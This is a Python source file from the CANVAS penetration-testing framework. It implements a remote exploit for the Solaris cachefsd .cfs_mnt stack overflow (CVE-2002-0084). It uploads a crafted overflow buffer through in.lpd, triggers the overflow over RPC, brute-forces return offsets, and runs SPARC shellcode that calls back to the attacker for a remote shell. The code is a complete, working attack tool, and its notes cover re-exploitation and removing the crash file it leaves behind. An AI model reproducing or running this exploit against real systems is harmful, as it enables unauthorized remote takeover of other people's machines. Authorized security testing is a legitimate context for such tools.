#! /usr/bin/env python
"""


"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2003
#http://www.immunityinc.com/CANVAS/ for more information

VERSION="1.0"

CHANGES="""


"""


notes="""

"""

#http://www.immunityinc.com/CANVAS/
#Questions, comments: sinan.eren@immunityinc.com
#

import os,getopt
import sys

sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")
sys.path.append("exploits/remote/unix/in_lpd")

from libs import rpc
from libs.rpc import Packer, Unpacker, TCPClient
from libs import xdr
import socket
import timeoutsocket
from exploitutils import *
import time
from tcpexploit import tcpexploit
import random
import canvasengine

import string
import struct
import random
import select
import libs.addressdb as addressdb

import in_lpd
from in_lpd import LPDExploit
from in_lpd import LPDException


NAME="cachefsd .cfs_mnt File Stack Overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sun"
DOCUMENTATION["Date public"]="05/01/2001"
DOCUMENTATION["CERT Advisory"]=""
DOCUMENTATION["CVE Name"] = "CVE-2002-0084"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0084"
DOCUMENTATION['CVSS'] = 7.2
DOCUMENTATION["References"]="http://sunsolve.sun.com/pub-cgi/retrieve.pl?doc=fsalert%2F44309"
DOCUMENTATION["Development Notes"]="This vulnerability had been marked only as a local attack\nbut by using in.lpd daemon"+\
                                   " we can upload the payload and achieve remote exploitation"
DOCUMENTATION["Re-Exploitation Note"]="After successful exploitation if you would like to exploit same target once again, you need to kill the first shell-listener."
DOCUMENTATION["Cleanup Notes"]="This attack leaves a /core file you should remove"

DESCRIPTION="cachefsd .cfs_mnt File Stack Overflow (requires in.lpd for file upload)"

PROPERTY = {}
PROPERTY["TYPE"]= "Exploit"
PROPERTY["SITE"]=  "Remote"
PROPERTY["ARCH"]= [ ["Solaris", "sparc"] ]
PROPERTY["VERSION"]= ["7", "8"]

GTK2_DIALOG="dialog.glade2"


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

class CFSDException(Exception):

    def __init__(self, args=None):
        self.args = args

    def __str__(self):
        return `self.args`

class CFSD_Packer(Packer):

    def pack_cfsd_fs_mounted(self, ra):
        dir1, dir2 = ra
        self.pack_string(dir1)
        self.pack_string(dir2)

class CFSD_Unpacker(Unpacker):

    def unpack_cfsd_fs_mounted(self):
        return

class CFSD_Client(TCPClient):

    def __init__(self, target):
        self.cfsd_d = { "PROGNUM": 100235, "VERSNUM": 1, "CACHEFSD_FS_MOUNTED": 5 }
        TCPClient.__init__(self, target, self.cfsd_d["PROGNUM"], self.cfsd_d["VERSNUM"])

    def addpackers(self):
        #print "addpackers()"
        self.packer = CFSD_Packer()
        self.unpacker = CFSD_Unpacker("")

    def mkcred(self):
        self.cred = rpc.AUTH_UNIX, rpc.make_auth_unix(random.randint(1,99999),\
                                                      "localhost", 0, 0, [])
        return self.cred

    def fs_mounted(self, dir1, dir2):
        return self.make_call(self.cfsd_d["CACHEFSD_FS_MOUNTED"], (dir1, dir2),\
                              self.packer.pack_cfsd_fs_mounted,\
                              self.unpacker.unpack_cfsd_fs_mounted)

class CFSDExploit(CFSD_Client):

    def __init__(self, target="", timeout = 15):
        self.tm = timeout
        self.set_target(target)
        self.name=NAME

    def set_target(self, ip):
        try:
            self.targethost = socket.gethostbyname(ip)
        except socket.gaierror, err:
            raise CFSDException, "CFSDExploit, Host: " + ip + " " + err[1]

    def get_target(self):
        return self.targethost

    def set_timeout(self, tm):
        self.tm = tm

    def get_timeout(self):
        return self.tm

    def setup(self):
        try:
            CFSD_Client.__init__(self, self.host)
        #except (socket.error, RuntimeError), self.err:
        except:
            raise CFSDException, "Failed to connect to the cachefsd daemon"

    def create_cfsmnt_file(self, offset=0):
        self.cfsbuf = ""

        self.cfsbuf += "\x30\x20\x31\x20\x32\x20\x33\x20"
        self.cfsbuf += "\xa4\x1c\x40\x11" * ((5188 - 8 - 72 - 800)/4)

        self.cfsbuf += struct.pack(">L", 0x4000001eL) # jump over the garbage. call +120
        self.cfsbuf += struct.pack(">L", 0x801bc00fL) # nop

        self.cfsbuf += struct.pack(">L", 0x42600L) * 2    # l0 - l1 old: 0xffbd81ac
        self.cfsbuf += struct.pack(">L", 0x12345678L) * 5
        self.cfsbuf += struct.pack(">L", 0x42600L) * 1    # l7 old: 0xffbefa88

        self.cfsbuf += struct.pack(">L", 0x42600L) * 2    # o0 o1 old: 0xffbefa88
        self.cfsbuf += struct.pack(">L", 0xfffffff0L) * 3
        self.cfsbuf += struct.pack(">L", 0x42600L) * 1    #o5 old: 0xffbefa88
        self.cfsbuf += struct.pack(">L", 0xffbef680L) * 1 #o6

        if not self.version:
            self.cfsbuf += struct.pack(">L", (0x64a10 + offset))     #o7, retaddr solaris 8: 0x64a10 7: 0x579f0 + 120
        else:
            self.cfsbuf += struct.pack(">L", (0x57b10 + offset))

        #shellcode len: 288
        self.cfsbuf += struct.pack(">L", 0xa41c4011L) * (200 - (len(self.shellcode)/4))
        self.cfsbuf += self.shellcode
        self.cfsbuf += "AAAA"
        self.cfsbuf += "\x0a\x00"

        return self.cfsbuf

    def exploit(self):


        self.log("[*] exploiting. the process can take up to 3 minutes. please wait. [*]")

        LPDExploit.__init__(self, self.host)

        try:
            LPDExploit.setup(self)  #do the lpd connection
            self.calculate_resname()
            self.sck.close() #attack() will reopen connection
        except LPDException, message:
            self.log("LPDExploit exception: %s"%message)

            return

        self.myname = ""

        for each in self.res_name:
            self.log("using source name: %s" % each)
            try:
                self.attack(-800000, each)
            except EOFError:
                self.log("Crashed daemon using source name: %s" % each)
                self.myname = each
                break
            except:
                pass

        if not len(self.myname):
            raise CFSDException, "Unable to find a vulnerable interface"

        #win32 python required the following
        timeoutsocket.setDefaultSocketTimeout(15)
        #raw_input("attach")
        offset = 0
        while offset < (0x400 * 10):
                self.log("trying offset: %d with source name: %s" % (offset, self.myname))
                if self.ISucceeded():
                   self.log("Succeeded!")
                   return 1

                try:
                    self.attack(offset, self.myname)
                except:
                    pass

                time.sleep(1)
                if self.ISucceeded():
                    self.log("Succeeded!")
                    return 1

                offset += 0x400

        offset = 0
        while offset > -(0x400 * 10):
               self.log("trying offset: %d with source name: %s" % (offset, self.myname))
               if self.ISucceeded():
                   self.log("Succeeded!")
                   return 1

               try:
                   self.attack(offset, self.myname)
               except:
                   pass

               time.sleep(1)
               if self.ISucceeded():
                   self.log("Succeeded!")


                   return 1

               offset -= 0x400

    def attack(self, offset, name):

        self.port = 515
        try:
            LPDExploit.setup(self)
            self.do_handshake()
        except LPDException,message:
            self.log("LPDExploit says: %s"%message)
            return
        #raw_input("attach to in.lpd")
        self.do_xfer_file(in_lpd.TYPE_DATA, self.create_cfsmnt_file(offset), ".cfs_mnt") #TYPE_DATA = "\x03"

        time.sleep(1)

        self.setup()
        #raw_input("attach")
        self.uploaddir = "/var/spool/lp/tmp/" + name
        self.fs_mounted("/", self.uploaddir)

        self.do_xfer_file(1, self.create_cfsmnt_file(offset), ".cfs_mnt") #TYPE_DATA = "\x03"
        self.do_abort()
        self.sck.close()

class theexploit(tcpexploit, CFSDExploit, LPDExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setPort(0)
        self.setHost("")
        self.setVersion(1)
        self.badstring="\x20\x00\\/.:?\r\n%?"  #0x20 is no good!
        return

    def createShellcode(self):
        localhost = self.callback.ip
        localport = self.callback.port
        print "Calling back to %s:%s"%(localhost,localport)
        return self.createSparcShellcode(self.badstring,localhost,localport)

    def neededListenerTypes(self):
            return [canvasengine.SOLARISSPARCMOSDEF]

    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        #print "ramones are my heros!!"
        LPDExploit.__init__(self, self.host)
        try:
            LPDExploit.setup(self)
        except:
            self.log("in.lpd is not running on the remote end.")
            return 0
        try:
            if self.do_handshake():
                self.log("in.lpd is running on the remote end. now checking for cachefsd ...")
                self.do_abort()
                self.sck.close()
        except:

            try:
                self.do_abort()
                self.sck.close()
            except:
                pass

            self.log("in.lpd cannot be used to upload files to the remote end.")
            return 0

        try:
            CFSD_Client.__init__(self, self.host)
        except:
            return 0
        self.log("cachefsd is running on the remote end.")
        return 1

    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))
        try:
            return self.dorun()
        except CFSDException, self.expstr:
            self.log(str(self.expstr))
            self.setInfo("%s attacking %s:%d (failed)"%(NAME,self.host,self.port))
            return 0
        self.setInfo("%s attacking %s:%d (done)"%(NAME,self.host,self.port))
        return

    def dorun(self):

        self.exploit()
        return

    #returns the sploitstring
    def makesploit(self):
        pass

    def displayVersions(self):
        print "0 : Solaris 8 Ultra "
        print "1 : Solaris 7 Ultra "
        return

#this stuff happens.
if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

